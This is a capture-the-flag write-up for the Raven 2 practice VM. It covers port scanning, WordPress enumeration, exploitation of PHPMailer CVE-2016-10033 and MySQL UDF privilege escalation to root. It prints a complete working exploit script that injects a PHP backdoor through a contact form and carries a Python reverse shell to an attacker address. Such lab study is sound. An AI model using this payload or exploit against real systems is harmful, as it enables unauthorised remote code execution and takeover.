# Raven 2
_There are four flags to capture_


## Nmap
````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 21:17 WEST
Nmap scan report for 10.0.2.36
Host is up (0.00044s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36940/tcp6  status
|   100024  1          47128/tcp   status
|   100024  1          51621/udp6  status
|_  100024  1          55920/udp   status
47128/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
````


## Port 80

The website is all static, but the 'blog' link redirects to a wordpress website

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/a79e7954-43aa-411c-adf1-070ac8879c17)

## Raven Security Wordpress

No CSS! :D

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/332560d6-df2d-4d9d-85bd-a06dbdce25a6)


I pressed a link and it redirected me to 'raven.local'. So let's add that to the hosts file

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/409c8599-3338-4004-a345-fae75874e95c)

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/60660a84-4ab7-4117-857a-a81c0b704150)


Hey CSS is back!

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/f41427ac-e488-47c3-8e67-86ecb3693bc6)


Anyway, running wpscan got me two users: michael and steven

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/adc6f392-44dd-4310-9e9e-635a9a5c0b2f)


wpscan also found this directory. 3 to go

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/0298df2f-ce3f-4a2d-bd42-5cc35992854e)

Found another flag

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/4781acf4-fb9a-4a15-a72c-f96f712697cf)


This directory has plenty of interesting stuff

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/7806b67f-ca8a-43dc-9e81-39bf5df54473)

One interesting thing was the PHP Mailer version inside the changelog file

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/9ee3650c-eafb-424a-98c6-55ceceaadf37)



## Reverse Shell

PHP Mailer is infamous for being exploitable. Here's a nice exploit - ``https://github.com/paralelo14/CVE_2016-10033/blob/master/anarcoder.py``

It did require a bunch of tweaking, not just the IP and port, but it finally connected... missing parameters, validation errors, etc...

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/113da3ae-48bd-468a-bb5e-a85bd1faad7f)

Here is my final script

````
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://10.0.2.36/'
direc='contact.php'
backdoor = '/backdoor.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'10.0.2.13\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\" -oQ/tmp/ -X/var/www/html/backdoor.php server"@protonmail.com',
	'subject': 'test',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target+direc, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
````

## Privilege Escalation


And there's another flag... 1 to go

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/20f4eefc-f09d-400d-accc-51232b3900a8)


Ran linpeas.sh and found credentials

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/8881658d-20e5-4e1b-87be-4b381cb623ed)


Searching the database I found 2 hashes, let's try cracking them

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/ea3912e2-30d7-409f-9cff-d3ad4c0884bc)

Only cracked one, and it seems like I was trolled. It doesn't work anywhere

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/de8ab849-8f7d-47b6-9025-d6b55e6c1310)


Anyway, we are running as the root user for mysql, so we can do stuff --> https://www.exploit-db.com/exploits/1518 and https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library

This exploit in specific does all the good stuff for us --> https://github.com/d7x/udf_root/blob/master/udf_root.py

And root!

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/af68f15b-5d23-4cd1-a9da-7bba9919d41a)


![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/02edb42a-c92b-41df-b40b-b629fd2facd1)

